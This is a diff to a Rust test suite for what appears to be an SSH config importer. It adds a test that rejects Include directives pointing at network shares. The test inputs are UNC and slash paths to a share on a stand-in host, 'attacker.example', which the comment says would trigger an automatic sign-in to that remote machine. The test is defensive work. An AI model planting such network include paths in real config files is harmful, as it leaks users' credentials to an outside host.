@@ -97,6 +97,16 @@ fn refuses_includes_nested_too_deeply() {
     assert_eq!(scan(&path, &[]).unwrap_err().code(), "import.includeTooDeep");
 }
 
+/// A config chosen to import doesn't read files on other computers' shares, which would sign
+/// in there as soon as it is shown; the user's own config, read to connect, still does.
+#[test]
+fn refuses_includes_on_network_paths() {
+    for include in [r"\\attacker.example\share\config", "//attacker.example/share/*"] {
+        let (_dir, path) = write_config(&format!("Host web\n    User alice\nInclude {include}\n"));
+        assert_eq!(scan(&path, &[]).unwrap_err().code(), "import.networkInclude", "{include}");
+    }
+}
+
 /// Options after an `Include` inside a `Host` block belong to that block, even when the
 /// included file has blocks of its own.
 #[test]
